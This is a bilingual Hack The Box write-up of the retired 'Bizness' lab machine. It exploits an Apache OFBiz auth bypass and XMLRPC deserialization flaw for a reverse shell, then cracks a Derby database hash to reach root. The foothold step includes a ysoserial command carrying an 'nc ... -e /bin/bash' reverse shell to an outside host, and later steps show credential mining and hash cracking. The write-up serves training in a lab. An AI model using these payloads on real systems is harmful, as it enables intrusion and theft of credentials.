# Bizness [Easy]

> **ES:** Máquina Linux fácil centrada en Apache OFBiz con RCE pre-autenticación y reutilización de credencial de base de datos para llegar a root.
> **EN:** Easy Linux machine focused on Apache OFBiz with pre-auth RCE and database credential reuse to reach root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | C4rm3l0 |
| **URL** | https://app.hackthebox.com/machines/Bizness |
| **IP lab** | 10.10.11.252 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía RCE en OFBiz (CVE-2023-49070 / CVE-2023-51467) y craqueo de hash SHA-1 de la base Derby reutilizado como clave de root.
> **EN:** Get `user.txt` and `root.txt` via OFBiz RCE (CVE-2023-49070 / CVE-2023-51467) and cracking a Derby DB SHA-1 hash reused as the root password.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] ffuf / dirsearch
- [ ] ysoserial (`CommonsBeanutils1`) + base64
- [ ] pwncat-cs / nc (reverse shell)
- [ ] hashcat (`-m 120`) + hashid
- [ ] grep sobre ficheros Derby (`seg0/c*.dat`)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo completo de puertos y registro del dominio `bizness.htb` en `/etc/hosts`.
> **EN:** Full port scan and registering the `bizness.htb` domain in `/etc/hosts`.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.252
echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp OpenSSH 8.4p1, 80/443/tcp nginx 1.18.0 (redirect a `https://bizness.htb/`), 40081/tcp tcpwrapped. OS Linux.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** La web muestra `Powered by Apache OFBiz`. Se identifica versión vulnerable a bypass de autenticación + deserialización Java en el endpoint XMLRPC.
> **EN:** The site footer shows `Powered by Apache OFBiz`. The version is vulnerable to auth bypass + Java deserialization at the XMLRPC endpoint.

```bash
curl -sk https://bizness.htb/ | grep -io "ofbiz"
# Imágenes locales preservadas: img/image_20240110-171031.png
```

**Resultado / Result:** Endpoint `/webtools/control/xmlrpc` expuesto; CVE-2023-49070 (relacionado con CVE-2023-51467) aplicable.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Se genera payload ysoserial, se codifica en base64 y se envía como objeto serializado dentro de una llamada XMLRPC `ProjectDiscovery`.
> **EN:** Build a ysoserial payload, base64-encode it, and deliver it as a serialized object inside a `ProjectDiscovery` XMLRPC call.

```bash
nc -lvnp 9999 &
# generar payload (JDK 8) y codificarlo
jdk8 -jar ./tools/ysoserial-all.jar CommonsBeanutils1 "nc 10.10.16.45 9999 -e /bin/bash" | base64 | tr -d "\n"
# POST XML a https://bizness.htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y
# con <methodName>ProjectDiscovery</methodName> y el blob en <serializable>
```

**Resultado / Result:** Reverse shell como `ofbiz` en `/opt/ofbiz`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El usuario `ofbiz` ya permite leer el home de la cuenta de servicio y el flag de usuario. No se pega el flag completo.
> **EN:** The `ofbiz` user can already read the service account home and the user flag. Full flag not pasted.

```bash
whoami  # ofbiz
ls -lh /home/ofbiz/
cat /home/ofbiz/user.txt  # formato: a6e1... (ofuscado)
```

**Resultado / Result:** `user.txt` leído como `ofbiz`.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Sin SUID obvios; se minan los ficheros Derby de OFBiz (`seg0/c*.dat`), se extrae un hash `$SHA$d$...`, se normaliza (`_`→`/`, `-`→`+`, base64→hex) y se craquea como SHA-1 con salt (`hashcat -m 120`), obteniendo `monkeybizness`, reutilizada vía `su` a root.
> **EN:** No obvious SUID; mine OFBiz Derby files (`seg0/c*.dat`), extract a `$SHA$d$...` hash, normalize it (`_`→`/`, `-`→`+`, base64→hex) and crack as salted SHA-1 (`hashcat -m 120`), getting `monkeybizness`, reused via `su` to root.

```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0
cat * | grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}'
# Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
hashcat -a 0 -m 120 '<hex>:d' rockyou.txt
su        # clave reutilizada
cat /root/root.txt  # formato: 1396... (ofuscado)
```

**Resultado / Result:** Técnica: credencial en base de datos + craqueo + reutilización (`su` a root).

---

## 🧠 Lo aprendido / Learned

> **ES:** Explotación de deserialización Java vía XMLRPC en OFBiz y flujo de transformación de hash propietario a formato craqueable.
> **EN:** Java deserialization exploitation via OFBiz XMLRPC and the flow for converting a proprietary hash into a crackable format.

- [ ] Auth-bypass + RCE pre-auth en Apache OFBiz (CVE-2023-49070 / CVE-2023-51467)
- [ ] Minería de credenciales en Derby (`seg0/*.dat`) y craqueo SHA-1 con salt en hashcat

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Bizness/index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Bizness (Easy) | Hack The Box — https://www.hackthebox.com/machines/bizness — HackTheBox (maker: C4rm3l0)
- **Walkthrough de referencia:** Bizness HTB Walkthrough — https://medium.com/@gsanjay1708/bizness-htb-walkthrough-7a452429a485 — Sanjay Gupta
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita; migración y normalización de la nota local, paráfrasis sin copiar literal ni publicar flags completas)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
